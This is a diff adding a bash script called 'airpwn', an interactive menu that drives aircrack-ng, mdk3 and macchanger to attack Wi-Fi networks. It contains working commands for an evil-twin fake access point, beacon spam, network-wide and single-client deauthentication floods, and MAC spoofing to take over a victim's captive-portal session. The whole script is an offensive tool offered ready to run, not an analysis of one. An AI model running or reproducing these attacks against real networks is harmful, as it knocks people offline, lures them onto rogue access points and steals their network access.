@@ -1,0 +1,221 @@
+#!/bin/bash
+
+AtkMenu() {
+clear
+echo -e "$(tput setaf 2)[1]Fake AP" #green
+echo -e "$(tput setaf 3)[2]Beacon Probe Spam"
+echo -e "$(tput setaf 4)[3]Signal Distuptor"
+echo -e "$(tput setaf 1)[4]Single Target Deauth" #red
+echo -e "$(tput setaf 5)[5]Use open wifi with web portal login" #purple
+echo -e "$(tput setaf 8)[6]Advanced MDK3 menu"
+echo -e "$(tput setaf 6)[s]Settings" #turqoise
+echo "[c]Command line"
+echo "[e]Exit airpwn"
+read -p "$(tput setaf 2)Choose an attack method: " atkmeth
+if [[ "$atkmeth" == "s" ]];
+then
+        ifconfig
+	airmon-ng
+        echo -e "$(tput setaf 1)[mon]Set interface into monitor mode"
+        echo "[int]Set network adapter as interface"
+        echo "Press enter to go back to menu"
+        read -p "Choose option: " settingsOpt
+        if [[ $settingsOpt == "mon" ]]
+        then
+                startMon
+        elif [[ $settingsOpt == "int" ]]
+        then
+                setMon
+	fi
+	AtkMenu
+elif [[ "$atkmeth" == "e" ]];
+then
+	exit
+elif [[ "$atkmeth" == "c" ]];
+then
+	clear
+	echo "$(tput setaf 1)!!!Enter 'out' to go back to menu!!!"
+        echo "$(tput setaf 2)Enter the command you want to run below:"
+	while [[ true ]]
+	do
+		printf "$(tput setaf 1)`whoami`@kali$(tput setaf 2):$(tput setaf 6)`pwd`$(tput setaf 2)# "
+		read out
+		if [[ "$out" == "out" ]]
+		then
+		AtkMenu
+		else
+		$out
+		fi
+		read -p "Press ENTER to clear..."
+		clear
+	done
+elif [[ -z $atkmeth ]]
+then
+echo "Empty command, try again"
+sleep 1.5
+AtkMenu
+elif [ ! -z `echo $atkmeth | grep "[1-6]+" -E`]
+then
+Attack
+else
+echo "Not a command, try again"
+sleep 1.5
+AtkMenu
+fi
+clear
+}
+
+Attack() {
+clear
+if (( $atkmeth == 1 )) #Fake AP
+then
+echo "Copy the BSSID address of the router and press [CONTROL C] to stop"
+sleep 2
+read -p "Press ENTER to start"
+airodump-ng $monInterface
+read -p "Enter the BSSID (MAC address of router): " bssid
+read -p "Enter the Channel (ch): " channel
+read -p "Enter the ESSID (Wifi Name): " essid
+read -p "Kick people off the router?(y/n) " kickBool
+if (( $kickBool == "y" ))
+then
+aireplay-ng --deauth -a $bssid  $monInterface > /dev/null
+echo "kicking people off"
+sleep 1
+fi
+airbase-ng -a $bssid -c $channel -i $monInterface -w password -Y --essid $essid $monInterface
+sleep 0.5
+echo "Fake AP with the name $essid created"
+read -p "Press enter when you want to stop" null
+echo "Stopped"
+sleep 1
+AtkMenu
+elif (( $atkmeth == 2 )) #Beacon Spam
+then
+xterm -e mdk3 $monInterface b -w -g &nohup
+echo "$(tput setaf 4) Started in xterm window (Control C to stop)"
+sleep 3
+AtkMenu
+elif (( $atkmeth == 3 )) #Signal Disruptor
+then
+xterm -e mdk3 $monInterface d &nohup
+echo -ne "Deauthing. \r"
+sleep 0.2
+echo -ne "Deauthing.. \r"
+sleep 0.2
+echo -ne "Deauthing... \r"
+sleep 0.2
+echo -ne "Deauthing.... \r"
+echo "Deauth in Progress in xterm window"
+clear
+AtkMenu
+elif (( $atkmeth == 4 )) #Single Target Deauth
+then
+xterm -e airodump-ng $monInterface &nohup
+read -p "Enter the BSSID (MAC address of router): " bssid
+read -p "Enter the target MAC address: " targetmac
+echo "Deauth started"
+xterm -e aireplay-ng --deauth -a $bssid -c $targetmac $monInterface > /dev/null
+AtkMenu
+elif (( $atkmeth == 5 )) #MAC
+then
+xterm -e airodump-ng $monInterface &nohup
+read -p "Enter the BSSID (MAC address of router): " bssid
+read -p "Enter the target MAC address: " targetmac
+iwconfig
+read -p "Enter wifi interface: " wifiMon
+echo "Old MAC `macchanger -s $wifiMon`"
+macchanger -m $targetmac $wifiMon
+echo "New MAC `macchanger -s $wifiMon`"
+xterm -e aireplay-ng --deauth -a $bssid -c $targetmac $monInterface > /dev/null
+echo "Deauth started, keep window open for dos"
+echo "Please connect to wanted network"
+sleep 4
+AtkMenu
+elif (( $atkmeth == 6 )) #advMDK
+then
+`cat /root/airPath`/advMdk
+AtkMenu
+elif [[ -z $atkmeth ]]
+then
+echo "Empty command, try again"
+sleep 1.5
+Attack
+else
+echo "Not a command, try again"
+sleep 1.5
+Attack
+fi
+}
+
+setMon() {
+clear
+ifconfig
+airmon-ng
+read -p "^^Enter interface for monitoring, if the interface is not in monitor mode (wlanXmon)please enter start: " monInterface
+if [[ $monInterface == "start" || $monInterface == "wlan0" || $monInterface == "wlan1" ]]
+then
+startMon
+fi
+echo "$monInterface" > `cat /root/airPath`/prevInterface
+}
+
+startMon() {
+clear
+ifconfig
+airmon-ng
+sleep 1
+read -p "Enter interface to start monitoring on (e to go back to menu): " start
+if [ $start == "e" ];
+then
+AtkMenu
+fi
+airmon-ng start $start 
+monInterface=$start
+monInterface+="mon"
+echo "Interface is set to $monInterface"
+echo "$monInterface" > `cat /root/airPath`/prevInterface
+sleep 0.4
+AtkMenu
+}
+
+clear
+echo '  ______   __                                             '
+echo ' /      \ |  \                                            '
+echo '|  $$$$$$\ \$$  ______    ______   __   __   __  _______  '
+echo '| $$__| $$|  \ /      \  /      \ |  \ |  \ |  \|       \ '
+echo '| $$    $$| $$|  $$$$$$\|  $$$$$$\| $$ | $$ | $$| $$$$$$$\'
+echo '| $$$$$$$$| $$| $$   \$$| $$  | $$| $$ | $$ | $$| $$  | $$'
+echo '| $$  | $$| $$| $$      | $$__/ $$| $$_/ $$_/ $$| $$  | $$'
+echo '| $$  | $$| $$| $$      | $$    $$ \$$   $$   $$| $$  | $$'
+echo ' \$$   \$$ \$$ \$$      | $$$$$$$   \$$$$$\$$$$  \$$   \$$'
+echo '                        | $$                              '
+echo '                        | $$                              '
+echo '                         \$$                              '
+sleep 1
+echo -ne "Loading.\r"
+sleep 0.5
+echo -ne "Loading..\r"
+sleep 0.5
+echo "Loading..."
+sleep 0.5
+echo "Done       "
+read -p "Do you want to reset previous montioring interface?(Y/n) " monBool
+if [ $monBool == "n" ];
+then
+echo "Previously used monitoring interface: $(cat $(cat /root/airPath)/prevInterface)"
+monInterface=$(cat $(cat /root/airPath)/prevInterface)
+sleep 1
+else
+setMon
+fi
+shopt -s expand_aliases
+source ~/.bash_aliases
+AtkMenu
+Attack
+
+
+
+
+
+
